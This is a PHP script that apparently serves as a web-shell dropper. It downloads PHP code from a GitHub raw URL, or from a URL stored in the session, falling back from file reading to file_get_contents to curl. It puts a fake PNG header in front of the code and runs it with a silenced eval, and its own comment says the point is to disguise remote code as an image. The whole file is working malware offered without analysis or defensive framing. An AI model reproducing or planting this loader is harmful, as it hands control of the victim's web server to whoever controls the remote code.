<?php

/*
Hex:    89 50 4E 47 0D 0A 1A 0A
ASCII:  ‰   P   N   G  \r  \n  SUB \n

This is a valid PNG file signature.
The script below disguises remote PHP code as a PNG image.
*/

function generateFakePngHeader() {
    // A minimal, valid PNG header with 1x1 pixel (can be appended to)
    $hex = '';
    $hex .= '89 50 4E 47 0D 0A 1A 0A';              // PNG signature
    $hex .= '00 00 00 0D 49 48 44 52';              // IHDR chunk
    $hex .= '00 00 00 01 00 00 00 01 08 02 00 00 00'; // Width=1, Height=1, Bit depth=8, Color=Truecolor
    $hex .= '90 77 53 DE';                          // CRC (valid for IHDR)
    $hex .= '00 00 00 0A 49 44 41 54 78 9C 63 60 00 00 00 02 00 01'; // IDAT (compressed pixel data)
    $hex .= 'E5 27 D4 A5';                          // CRC for IDAT
    $hex .= '00 00 00 00 49 45 4E 44 AE 42 60 82';  // IEND

    return hex2bin(str_replace(' ', '', $hex));
}

// Start session
session_start();

// Define main source URL
$mainUrl = $_SESSION['ts_url'] ?? 'https://raw.githubusercontent.com/jjyyk/jjyyk/refs/heads/main/class';

// Load remote data from URL
function loadRemoteData($url) {
    $content = '';

    // Try file access first
    try {
        $file = new SplFileObject($url);
        while (!$file->eof()) {
            $content .= $file->fgets();
        }
    } catch (Throwable $e) {
        $content = '';
    }

    // Try file_get_contents
    if (strlen(trim($content)) < 1) {
        $content = @file_get_contents($url);
    }

    // Fallback to curl
    if (strlen(trim($content)) < 1 && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
    }

    return $content;
}

// Load remote code
$remoteCode = loadRemoteData($mainUrl);

// Prepend fake PNG header
$fakePng = generateFakePngHeader();
$payload = $fakePng . $remoteCode;

// Execute payload if valid
if (strlen(trim($payload)) > 0) {
    @eval("?>$payload");
}
?>
